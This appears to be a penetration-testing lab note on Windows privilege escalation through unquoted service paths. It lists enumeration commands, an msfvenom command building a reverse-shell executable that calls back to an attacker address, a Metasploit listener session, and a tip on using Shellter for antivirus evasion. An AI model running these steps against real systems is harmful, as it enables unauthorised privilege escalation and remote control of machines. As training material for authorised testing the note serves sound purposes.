# Unquoted Service Path

## **Finding Unquoted Service Path Vulnerabilities**

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1. Being able to write to a folder on the path (icacls)
2. Being able to restart the service

If either of these conditions is not met, successful exploitation may not be possible. \


The command below will list services running on the target system. The result will also print out other information, such as the display name and path.&#x20;

`wmic service get name,displayname,pathname,startmode`

You can further check the binary path of this service using the command below:&#x20;

`sc qc unquotedsvc`

Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

`.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"`

The output will list user groups with read (R) and write (W) privileges on the "Program Files" folder.



We now have found a folder we can write to. As this folder is also in the service's binary path, we know the service will try to run an executable with the name of the first word of the folder name.&#x20;



`msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe`

```shell-session
msf6 > use exploit/multi/handler 
[*] Using configured payload windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 8899
lport => 8899
msf6 exploit(multi/handler) > set lhost 10.9.6.195
lhost => 10.9.6.195
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.6.195:8899
```

{% hint style="info" %}
use shellter to evade AV. Ensure that shellter is installed with Wine on Kali. The instructions can be found in the AV Evasion module if needed
{% endhint %}
